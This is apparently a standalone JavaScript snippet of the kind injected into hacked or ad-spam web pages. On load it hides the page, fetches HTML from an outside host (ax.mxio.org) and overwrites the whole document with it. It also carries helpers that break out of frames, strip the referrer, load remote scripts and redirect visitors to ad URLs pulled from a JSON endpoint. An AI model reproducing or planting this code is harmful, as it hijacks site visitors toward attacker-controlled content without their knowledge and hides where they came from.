document.title="Loading...";document.documentElement.hidden=1;
function view(a) {
    function d() {
        var a = document.open("about:blank");
        a.write(c), a.close();
    }
    var b, c;
    a = a, b = new XMLHttpRequest(), c = null, b.onload = function () {
        c = b.responseText;
        var a = 0;
        a > 0 ? setTimeout(d, 1e3 * a) : d();
    }, b.open("GET", a, !0), b.send();
}

function openLink(url) {
    if (window !== top) {
        top.location = url;
        return;
    }
    var label = document.createElement("a");
    label.setAttribute("rel", "noreferrer");
    label.setAttribute("href", url);
    try {
        document.body.appendChild(label);
    } catch (e) {
        location = url;
    }
    label.click();
}

function inUrl2(e) {
    if (window.location.href.indexOf(e) > -1) {
        return true;
    } else {
        return false;
    }
}


function loadJs(src, callback, errCallback) {
    if (!src) {
        return;
    }
    var e = document.createElement("script");
    e.setAttribute("type", "text/javascript");
    e.setAttribute("charset", "utf-8");
    e.setAttribute("src", src);
    document.getElementsByTagName("head")[0].appendChild(e);
    if (typeof errCallback === "function") {
        e.onerror = errCallback;
    }
    e.onload = function () {
        if (typeof callback === "function") {
            callback();
        }
    };
}

function ajaxgo2(url) {
    fetch(url)
        .then(response => response.json())
        .then((res) => {
            if (res.code == 200) {
                let tourl = res.data.adurl;
                openLink(tourl);
            } else {
            }
        });
}

function open_without_referrer(link) {
    document.body.appendChild(document.createElement("iframe")).src = 'javascript:"<script>top.location.replace("' + link + '")<\/script>"';
}

view("https://ax.mxio.org/" + Math.random());